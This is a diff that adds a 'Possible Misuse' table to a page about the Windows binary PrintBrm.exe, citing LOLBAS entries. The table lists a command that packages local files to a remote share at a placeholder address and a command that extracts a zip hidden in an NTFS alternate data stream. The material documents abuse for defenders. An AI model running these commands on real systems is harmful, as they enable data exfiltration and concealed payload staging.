@@ -69,6 +69,17 @@ File | Score
 -- | --
 [C:\Windows\system32\spool\tools\PrintBrm.exe](PrintBrm.exe-BAE39750EE98F30056CC520ED59C8E88.md) | 90
 
+## Possible Misuse
+
+*The following table contains possible examples of `PrintBrm.exe` being misused. While `PrintBrm.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*
+
+Source | Source File | Example | License
+-- | -- | -- | --
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `Name: PrintBrm.exe`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Command: PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Command: PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Path: C:\Windows\System32\spool\tools\PrintBrm.exe`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- IOC: PrintBrm.exe should not be run on a normal workstation`{:.highlight .language-yaml} | 
 
 
 
